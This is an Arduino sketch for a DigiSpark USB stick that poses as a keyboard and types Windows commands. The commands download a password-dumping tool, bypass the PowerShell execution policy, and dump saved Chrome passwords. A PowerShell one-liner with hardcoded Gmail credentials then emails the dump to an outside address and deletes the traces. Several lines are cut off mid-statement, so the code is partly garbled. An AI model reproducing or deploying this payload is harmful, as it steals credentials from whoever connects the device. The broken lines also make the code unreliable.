#include "DigiKeyboard.h"

// Replace from@gmail.com - source gmail
// Replace passgmail      - source pass
// Replace to@gmail.com   - destination gmail
// Replace LINK_TO_EXE    - url to ChromePass

void setup() {
  pinMode(1, OUTPUT);
  
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.
  DigiKeyboard.delay(
  DigiKeyboard.println(F("cmd"
  DigiKeyboard.delay(
  DigiKeyboard.
  DigiKeyboard.println("cd Downloads & mkdir PASS & cd PASS"
  DigiKeyboard.
  DigiKeyboard.delay(
  DigiKeyboard.print(F("echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; wget LINK_TO_EXE -OutFile a.exe > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("Start-Process -FilePath a.exe -ArgumentList \"/shtml pass.html\""));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('clash13of9clans@gmail.com', 'fookyuoo123456'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'clash13of9clans@gmail.com'; $ReportEmail.To.Add('clash11of8clans@gmail.com'); $ReportEmail.Subject = 'DigiSpark - User: ' + $env:username; $ReportEmail.Body = 'ChromePass'; $ReportEmail.Attachments.Add('pass.html'); $SMTPInfo.Send($ReportEmail);"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("cd .."));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("rmdir PASS /s"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  digitalWrite(1,HIGH);
  delay(100);
  digitalWrite(1,LOW);
  delay(100);
